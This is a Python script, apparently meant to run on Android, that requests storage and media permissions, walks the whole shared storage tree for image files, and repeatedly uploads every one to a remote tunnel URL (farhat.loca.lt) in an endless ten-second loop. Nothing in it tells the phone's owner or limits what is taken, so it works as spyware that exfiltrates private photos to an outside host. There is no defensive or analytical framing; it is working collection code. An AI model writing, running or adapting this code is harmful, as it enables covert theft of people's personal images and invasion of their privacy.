# ----- Android runtime permission-----
ANDROID = False
try:
    from android.permissions import request_permissions, Permission
    ANDROID = True
except Exception:
    pass

def request_android_perms():
    if not ANDROID:
        return
    perms = [Permission.INTERNET]
    try:
        perms += [Permission.READ_EXTERNAL_STORAGE, Permission.WRITE_EXTERNAL_STORAGE]
    except Exception:
        pass
    try:
        perms += [Permission.READ_MEDIA_IMAGES]  # Android 13+
    except Exception:
        pass
    request_permissions(perms)

# Call this once before scanning:
try:
    request_android_perms()
except Exception:
    pass
# ---------------------------------------



import os
import time
import datetime
import requests
import socket
from urllib.parse import urlparse

# --- CONFIG ---
SERVER_URL = 'https://farhat.loca.lt/upload'  # change to your server IP
START_PATH = "/storage/emulated/0/"  # root of Android storage
IMAGE_EXTS = (".jpg", ".jpeg", ".png", ".gif", ".bmp", ".webp")
SLEEP_TIME = 10      # wait time (seconds) between full scans
MAX_FILE_MB = 20     # skip files larger than this


# --- check if server is reachable ---
def server_available(url, timeout=2.0) -> bool:
    try:
        u = urlparse(url)
        host = u.hostname
        port = u.port or (443 if u.scheme == "https" else 80)
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except Exception:
        return False


# --- scan storage recursively for images ---
def find_all_images(start_path):
    found = []
    for root, dirs, files in os.walk(start_path):
        for name in files:
            if name.lower().endswith(IMAGE_EXTS):
                full_path = os.path.join(root, name)
                try:
                    size_mb = os.path.getsize(full_path) / (1024 * 1024)
                    if size_mb <= MAX_FILE_MB:
                        found.append(full_path)
                except:
                    pass
    return found


# --- upload image to server ---
def upload_image(path):
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = os.path.basename(path)
    try:
        with open(path, "rb") as img_file:
            files = {'screenshot': (f"{timestamp}_{filename}", img_file, 'image/*')}
            response = requests.post(SERVER_URL, files=files)
            print(f"[{timestamp}] Uploaded: {filename} -> {response.status_code}")
    except Exception as e:
        print(f"Upload failed for {filename}: {e}")


# --- main loop ---
def main():
    print("Starting full storage scan & uploader...")

    while True:
        if not server_available(SERVER_URL):
            print("❌ Server not reachable, retrying...")
            time.sleep(SLEEP_TIME)
            continue

        print("✅ Server connected, scanning for images...")
        images = find_all_images(START_PATH)

        if not images:
            print("No images found.")
        else:
            print(f"Found {len(images)} image(s). Uploading...")
            for img in images:
                upload_image(img)

        print(f"Sleeping {SLEEP_TIME} sec before next scan...\n")
        time.sleep(SLEEP_TIME)


if __name__ == "__main__":
    main()
